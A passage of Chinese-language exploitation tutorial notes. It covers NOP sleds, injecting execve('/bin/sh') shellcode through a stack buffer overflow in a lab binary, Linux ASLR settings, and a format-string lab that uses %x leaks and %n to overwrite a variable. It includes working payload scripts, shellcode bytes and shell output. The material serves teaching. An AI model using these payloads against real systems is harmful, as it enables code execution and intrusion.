我們希望我們的程式從 `do something A` 開始執行，但是實際情況下，我們可能會從 `do something B` 開始執行，這時候，我們需要運用 NOP Sleds 的技巧，NOP 為組合語言指令，執行後不進行任何動作，我們可以通過在 Shellcode 中塞入大量的 NOP 指令，確保 Shellcode 正確的被執行，以下概念
```
NOP
NOP
NOP <-- 假設從這裡開始執行 (從哪裡開始我們可以通過 rip 決定)
NOP
NOP
do something A
do something B
```
塞入 NOP 可以確保 Shellcode 是被完整執行的，我們修改我們的腳本，接著重新執行
```py
import struct
padding ="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
ebp = "TTTT"
eip = struct.pack("I", 0xffffcd20+150)
shellcode = "\x90" * 150 + "\xCC" * 4
payload = padding + ebp + eip + shellcode
print payload
```
```shell
$ python2 script.py | ./stack5
[1]    17122 done                      python2 script.py | 
       17123 trace trap (core dumped)  ./stack5
```
成功執行結果。

一般來說，我們注入 Shellcode 的攻擊，都是希望能夠拿到 Shell 取得主機的控制權限，這邊我們可以試著找到開啟 `sh` 的 Shellcode，可以到 https://shell-storm.org/ 中尋找合適的 Shellcode，下面為一個 Linux/x86 `execve(/bin/sh)` 的 Shellcode
```c
/*
Title:	Linux x86 execve("/bin/sh") - 28 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org


Disassembly of section .text:

08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80



*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";

int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}

```
以下為一個通過 Buffer overflow get shell 的範例
```py
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
ebp = "TTTT"
eip = struct.pack("I", 0xffffcd20+150)
shellcode = "\x90" * 150 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = padding + ebp + eip + shellcode
print payload
```
接著我們嘗試執行，會發現沒有發生任何事情
```shell
$ python2 script.py | ./stack5
```
我們思考，Shell 執行時，我們希望會獲得輸入，在 Linux 預設情況下，會是從 `stdin` 這個檔案描述子尋找，檔案描述子對應到的檔案為我們的鍵盤，但是在我們的範例中，我們使用 `./stack5` 去開了一個 Shell，這時候 `stdin` 和 `stdout` 會導向到我們的 `./stack5` 中，在 `./stack5` 結束並被 Shell 取代時，`./stack5` 會將 pipe 關閉，但這時候 Shell 便收不到 input，因此關閉，我們可以使用一些技巧完成，假設我們輸入 `cat` 
```shell
$ cat
123
123
Hello
Hello
```
可以看到我們輸入了什麼內容，螢幕上就會印出什麼內容，這時候 `stdin` 連接到我們的鍵盤，`stdout` 連接到終端機上，也就是 Linux 預設行為。

我們可以使用 `;` 去串連多個指令，假設我們執行以下
```shell
$ python2 script.py ; cat
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSSTTTT����������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin�����°̀
                                                                                              1�@̀
```
`cat` 先將 `python2 script.py` 結果印到螢幕上，接著等待使用者輸入，這邊我們要做的事情，是希望我們執行 `python2 script.py` 將腳本輸入到 `./stack5` 之後，回傳的 Shell 由 `cat` 接收，接著 `cat` 印出 Shell，這邊意義為將 `stdout` 接到終端機上，而 Shell 的 `stdin` 則會被接到鍵盤上，完成獲得 Shell 的操作。

```shell
$ (python2 script.py ; cat) | ./stack5
ls
payload  peda-session-stack5.txt  script.py  stack5
whoami
ubuntu
```
成功獲得 Shell。
## ASLR
在大多數攻擊中，如 Lab3 的 Jump to function，我們都具備一個先決條件，便是我們已經知道程式的記憶體分布，我們需要提前知道一些資料的位置，才能夠使我們的攻擊成立，而 ASLR 全名為 Address Space Layout Randomization，意義為記憶體分布隨機化，為一種基於作業系統層面的技術，在 2001 時出現在 PaX 專案中，於 2005 年正式的引入到 Linux 中，ASLR 提供了機率上的安全性，讓攻擊的成功率降低。

在 Linux 中，ASLR 的設定放置於 `/proc/sys/kernel/randomize_va_space`，一共有三種情況
- 0 表示關閉 ASLR
- 1 表示部分開啟，會將 mmap 的基底記憶體地址，stack 和 VDSO 記憶體分頁進行隨機化
- 2 基於 1 的部分，增加 heap 上的隨機化

我們可以看在開啟 ASLR 的記憶體分布情況
```c
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

int main(void) {
    int stack;
    int *heap = (int *)malloc(sizeof(int));
    void *handle = dlopen("libc.so.6", RTLD_NOW | RTLD_GLOBAL);

    printf("executable: %p\n", &main);
    printf("system@plt: %p\n", &system);
    printf("heap: %p\n", heap);
    printf("stack: %p\n", &stack);
    printf("libc: %p\n", handle);

    free(heap);
    return 0;
}
```
```shell
$ gcc ASLR.c -no-pie -fno-pie -ldl -o ASLR
```
```shell
$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
[sudo] password for ubuntu: 
2
$ ./ASLR
executable: 0x4011d6
system@plt: 0x4010b0
heap: 0x1a0f2a0
stack: 0x7ffc01287474
libc: 0x7f171aa74160
$ ./ASLR
executable: 0x4011d6
system@plt: 0x4010b0
heap: 0x1e732a0
stack: 0x7ffddde4e854
libc: 0x7fba3d29f160
```
可以看到在開啟 ASLR 時，只有程式本身和 PLT 沒有改變，其餘的內容都會發生改變。
## Lab5: Format_String
在 C 語言中，`printf` 是用來進行格式化輸出的函式，以下舉例
```c
printf("Welcome to %s", "HackerSir");
```
`printf` 讀取格式化字串，並且讀取到 `%s`，表示將第二個輸入的參數，也就是 `"HackerSir"` 以字串的形式進行解析。

`printf` 有許多格式化解析部份，諸如 整數形式 `%d`，浮點數形式 `%f`，字串形式 `%s` 等等。

我們看到以下程式碼
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int target;

void func(char *string) {
    printf(string);

    if(target) {
        printf("you have modified the target :)\n");
    }
}

int main(int argc, char **argv) {
    func(argv[1]);
}
```
這一題目標為我們希望通過 `printf` 函式，去成功修改全域變數 `target`，在這一題中可以發現到，我們 `printf` 將 `string` 作為第一個參數，而非第二個參數，因此我們可以試著輸入格式化字串，執行程式並查看執行結果 (執行之前，請先關閉 ASLR)
```shell
$ ./format_string "%x %x %x %x %x %x %x %x %x %x %x"
ffffdc18 ffffdc30 403e18 f7e1af10 f7fc9040 2 ffffe036 ffffdb00 4011b9 ffffdc18 401070
```
可以看到我們印出了許多 16 進位的內容，回顧先前我們在使用 gdb 時的狀況，這邊看起來像是把 stack 的內容給印出來了，回顧先前提到的函式呼叫，在 32 位元底下，我們會將參數放到 stack 中，接著呼叫函式。

正常的使用 `printf`，我們的參數會位於 stack 上，這個參數就是接下來我們要印出的內容，而在這邊我們沒有參數，而 `printf` 的行為會在 stack 上找出可印出的內容，也就是 stack 上的任意內容，並且印在螢幕上。這屬於記憶體洩漏的漏洞 (memory leak)。

假設我們有一些保護機制，像是 ASLR 或是 canary，我們可以通過記憶體洩漏的漏洞，像是上面看到的格式化字串的漏洞，我們可以藉此將 canary 的值洩漏出來，達到繞過 canary 保護機制的效果，使得 buffer overflow 的攻擊能夠成立。

回到題目本身，我們該如何去修改 `target` 這個值？這邊我們可以使用 `printf` 中 `%n` 的方式，`%n` 的作用為將已經印出來的字元數目寫入到某一個整數中，參數為 `int *`，以下舉例

```c
#include<stdio.h>

int main(void) {
    int n = 0;
    printf("Hello%n World\n", &n);
    printf("%d", n);
    return 0;
}
```
```
Hello World
5
```
在這個例子中，`%n` 之前已經印出了 5 個字元 `Hello`，並將已經印出的字元數目寫入到 `n` 中，可以看到傳入的參數為 `int *`，接著我們反參考並且印出，得到 `n = 5`。

如果我們可以洩漏出 `target` 的記憶體地址，就可以使用這個手法將 `target` 的值進行更改了。

我們可以使用 `objdump` 找出二進位檔案中所有的符號，並找到 `target` 的記憶體地址
```shell
$ objdump -t format1 | grep target
08049638 g     O .bss   00000004              target
```
找到 `target` 位於記憶體地址中 `0x08049638` 的位置，接著我們需要對這個位址進行寫入，我們試著印出更多在 stack 上的內容，使用 python 撰寫腳本，並作為 `format_string` 執行檔的參數
```py
print("%x " * 200)
```
```shell
$ ./format_string "`python3 script.py`"
ffffd9d8 ffffd9f0 403e18 f7e1af10 f7fc9040 2 ffffddfe
ffffd8c0 4011b9 ffffd9d8 401070 2 f7c29d90 0 401193 ffffd9c0
ffffd9d8 0 47c99224 ffffd9d8 401193 403e18 f7ffd040 f66d9224
7d459224 0 0 0 0 0 f28cf900 0 f7c29e40 ffffd9f0 403e18
f7ffe2e0 0 0 401070 ffffd9d0 0 0 401095 ffffd9c8 1c 2
ffffddee ffffddfe 0 ffffe057 ffffe06e ffffe07d ffffe091
ffffe0c7 ffffe0fa ffffe111 ffffe11c ffffe150 ffffe1a8 
ffffe1bb ffffe1d7 ffffe222 ffffe234 ffffe250 ffffe266 
ffffe27b ffffe291 ffffe2ad ffffe2ce ffffe2ed ffffe304 
ffffe315 ffffe324 ffffe336 ffffe34f ffffe365 ffffe378 
ffffe387 ffffe399 ffffe3a9 ffffe3bd ffffe3cc ffffe3db 
ffffe411 ffffe448 ffffe47a ffffe4fa ffffe512 ffffe51f 
ffffe561 ffffe574 ffffe592 ffffe5a4 ffffe63e ffffe651 
ffffe683 ffffe68b ffffe69e ffffe6cd ffffe6e3 ffffe6f7 
ffffe703 ffffe716 ffffe73a ffffe74a ffffe764 ffffe7b2 
ffffe7ca ffffe808 ffffe827 ffffe836 ffffe86a ffffe881 
ffffe899 ffffe8aa ffffe8e4 ffffe8f9 ffffe904 ffffe918 
ffffe968 ffffe974 ffffe988 ffffe9a4 ffffe9af ffffe9b7 
ffffe9d7 ffffefc6 ffffefd0 0 21 f7fc1000 33 d30 10 178bfbff 6 
1000 11 64 3 400040 4 38 5 d 7 f7fc3000 8 0 9 401070 b 3e8 c 
3e8 d 3e8 e 3e8 17 0 19 ffffddc9 1a 2 1f ffffefe8 f ffffddd9 
0 0 0 8cf95b00 5ea3e63f 363878c9 0 0 6d726f66 6e697274 
20782520 78252078 25207825 20782520 78252078 25207825 
20782520 78252078 25207825 20782520 78252078 25207825 
20782520 78252078 25207825 20782520 78252078 25207825 
20782520 78252078 25207825
```
我們發現到最後不斷出現 `25207825` 等看起來不像是記憶體地址的內容，我們推測可能為 ASCII 編碼，我們試著使用 python 進行解碼
```shell
$ python3 -c "print(bytes.fromhex('25207825').decode())"
% x%
```
我們發現到內容為 `% x%`，看起來是我們輸入的參數，我們改變我們的 python 腳本並進行驗證，為了方便觀察，我們使用 pwntools 撰寫腳本。
```py
from pwn import *

payload = "AAAA" + "%x " * 169
p = process(["./format1", payload])
output = p.recvall()
print(output)
```
```diff
$ python3 script.py
[+] Starting local process './format1': pid 424
[+] Receiving all data: Done (1.11KB)                                                                                   [*] Process './format1' stopped with exit code 
0 (pid 424)
b'AAAA804960c ffffcbc8 8048469 f7ffd000 f7fb7000 
ffffcbc8 8048435 ffffcda8 0 804845b 0 f7fb7000 f7fb7000 
0 f7de9ed5 2 ffffcc64 ffffcc70 ffffcbf4 f7fb7000 0 
ffffcc48 0 f7ffd000 0 f7fb7000 f7fb7000 0 a640b1d0 
e4ea37c0 0 0 0 2 8048340 0 f7fe7ad4 f7fe22d0 f7ffd000 2 
8048340 0 8048361 804841c 2 ffffcc64 8048450 8048440 
f7fe22d0 ffffcc5c 1c 2 ffffcd9e ffffcda8 0 ffffcfa8 
ffffcfb8 ffffcfcf ffffcfff ffffd014 ffffd054 ffffd061 
ffffd078 ffffd088 ffffd095 ffffd0b4 ffffd696 ffffd6b8 
ffffd6cc ffffd6ec ffffd6f6 ffffd6fe ffffd71f ffffd760 
ffffdf96 ffffdfa6 ffffdfdb 0 20 f7fcf540 21 f7fcf000 10 
178bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 f7fd1000 8 0 
9 8048340 b 3e8 c 3e8 d 3e8 e 3e8 17 0 19 ffffcd7b 1a 2 
1f ffffdfee f ffffcd8b 0 0 0 bb000000 88d13869 6617aceb 
bfea3541 696df540 363836 0 0 0 2f2e0000 6d726f66 317461 
+41414141 25207825 78252078 20782520 25207825 78252078 
+20782520 25207825 78252078 20782520 25207825 78252078 
+20782520 25207825 78252078 20782520 25207825 78252078 
+20782520 25207825 78252078 20782520 25207825 78252078 
+20782520 25207825 78252078 20782520 25207825 78252078 
+20782520 25207825 78252078 20782520 25207825 78252078 '
```

注意到綠色的部份，出現了 `0x41414141`，在 C 語言中，`argc`, `argv` 會儲存在 stack 中某一個區域，驗證了上面我們在 stack 中看到參數出現的結果。

這邊可以思考一下為什麼我們選擇輸入 169，也可以嘗試輸入其他的數字進行嘗試，你會發現可能剛剛輸入的 `AAAA`，在 stack 中不會按照 `41414141` 的方式排序在 stack 中，有可能會是 `41414100 41` 的方式。
![](https://hackmd.io/_uploads/B1xGVTxS3.png)
看到 `argv` 會出現在 stack 中高位記憶體地址的部份。

我們接下來的攻擊想法，為將 `target` 的記憶體地址放到 stack 中，接著我們如果通過 `printf` 可以成功讀取到該記憶體地址，我們就可以通過 `%n` 對該記憶體地址進行修改，達到運用格式化字串漏洞修改其他無法修改的變數效果，以下為概念演示
```py
from pwn import *

address = "\x38\x96\x04\x08"

payload = "AAAAAAAAAAAAA" + address + 'BBB'+"%x " * 157

p = process(["./format1", payload])
output = p.recvall()
print(output)
```
```diff
AAAAAAAAAAAAA8\x96\x04\x08BBB804960c ffffcbe8 8048469
f7ffd000 f7fb7000 ffffcbe8 8048435 ffffcdbc 0 804845b 0 
f7fb7000 f7fb7000 0 f7de9ed5 2 ffffcc84 ffffcc90 
ffffcc14 f7fb7000 0 ffffcc68 0 f7ffd000 0 f7fb7000 
f7fb7000 0 b0377529 f29db339 0 0 0 2 8048340 0 f7fe7ad4 
f7fe22d0 f7ffd000 2 8048340 0 8048361 804841c 2 
ffffcc84 8048450 8048440 f7fe22d0 ffffcc7c 1c 2 
ffffcdb2 ffffcdbc 0 ffffcfa8 ffffcfb8 ffffcfcf ffffcfff 
ffffd014 ffffd054 ffffd061 ffffd078 ffffd088 ffffd095 
ffffd0b4 ffffd696 ffffd6b8 ffffd6cc ffffd6ec ffffd6f6 
ffffd6fe ffffd71f ffffd760 ffffdf96 ffffdfa6 ffffdfdb 0 
20 f7fcf540 21 f7fcf000 10 178bfbff 6 1000 11 64 3 
8048034 4 20 5 7 7 f7fd1000 8 0 9 8048340 b 3e8 c 3e8 d 
3e8 e 3e8 17 0 19 ffffcd9b 1a 2 1f ffffdfee f ffffcdab 
0 0 0 be000000 4a36de81 fa6b27d0 2e834aba 69c92780 
363836 2f2e0000 6d726f66 317461 41414141 41414141 
+41414141 4963841 42424208 25207825 78252078 20782520 
25207825 78252078 20782520 25207825 78252078 20782520 
25207825 78252078 20782520 25207825 78252078 20782520 
25207825 78252078 20782520 25207825 78252078 20782520 
25207825
```
上面是一個我們輸入的記憶體地址沒有在 stack 中對齊的狀況，我們輸入的記憶體地址為 `"\x38\x96\x04\x08"`，在 stack 中應該為 `8049638`，但是在上面變成 `4963841 42424208`，`08` 跑到下一個 word，在使用 `%x` 讀取時，我們便會讀取到 `4963841`，而非 `8049638`。下面為一個有對齊的例子
```py
payload = "AAAAAAAAAAAAA" + address + 'BBB'+"%x " * 156
```
```diff
AAAAAAAAAAAAA8\x96\x04\x08BBB804960c ffffcbe8 8048469 
f7ffd000 f7fb7000 ffffcbe8 8048435 ffffcdbf 0 804845b 0 
f7fb7000 f7fb7000 0 f7de9ed5 2 ffffcc84 ffffcc90 
ffffcc14 f7fb7000 0 ffffcc68 0 f7ffd000 0 f7fb7000 
f7fb7000 0 be7a93d2 fcd055c2 0 0 0 2 8048340 0 f7fe7ad4 
f7fe22d0 f7ffd000 2 8048340 0 8048361 804841c 2 
ffffcc84 8048450 8048440 f7fe22d0 ffffcc7c 1c 2 
ffffcdb5 ffffcdbf 0 ffffcfa8 ffffcfb8 ffffcfcf ffffcfff 
ffffd014 ffffd054 ffffd061 ffffd078 ffffd088 ffffd095 
ffffd0b4 ffffd696 ffffd6b8 ffffd6cc ffffd6ec ffffd6f6 
ffffd6fe ffffd71f ffffd760 ffffdf96 ffffdfa6 ffffdfdb 0 
20 f7fcf540 21 f7fcf000 10 178bfbff 6 1000 11 64 3 
8048034 4 20 5 7 7 f7fd1000 8 0 9 8048340 b 3e8 c 3e8 d 
3e8 e 3e8 17 0 19 ffffcd9b 1a 2 1f ffffdfee f ffffcdab 
0 0 0 24000000 b9ff6e2c 8716a0f6 6fd833cc 69cb28aa 
363836 0 662f2e00 616d726f 41003174 41414141 41414141 
+41414141 8049638 25424242 78252078 20782520 25207825 
78252078 20782520 25207825 78252078 20782520 25207825 
78252078 20782520 25207825 78252078 20782520 25207825 
78252078 20782520 25207825 78252078 20782520
```
可以看到 `8049638` 成功在 stack 中對齊了，接下來我們要不斷調整 `%x` 的數量，直到我們剛好印出的最後一個記憶體地址，就是 `8049638`。

以下為嘗試使用 `134` 和 `136` 的結果
```
134:
3174616d 41414100 41414141 41414141
136:
41414141 41414141 8049638 25424242 78252078
```
這邊我們推測，`134` 個 `%x` 後，也就是印出了 `134` 個 stack 中 word size 的內容，下一個記憶體地址便是 `8049638` 了，因此我們如果在 `"%x" * 134` 加上 `%n`，我們修改到的，便是 `0x8049638` 這個記憶體地址，我們使用以下 python 腳本進行驗證
```py
from pwn import *

address = "\x38\x96\x04\x08"
payload = "AAAAAAAAAAAAA" + address + 'BBB'+"%x " * 134 + "%n"

p = process(["./format1", payload])
output = p.recvall()
print(output)
```
我們成功使用格式化字串的漏洞，對無法存取的變數成功進行修改了。

## 參考資料
[LiveOverflow](https://www.youtube.com/@LiveOverflow)

[Anglebox](https://www.youtube.com/@scwuaptx)

[Binary Exploitation Notes](https://ir0nstone.gitbook.io/notes/)

[CTF 101 Binary Exploitation](https://ctf101.org/binary-exploitation/overview/)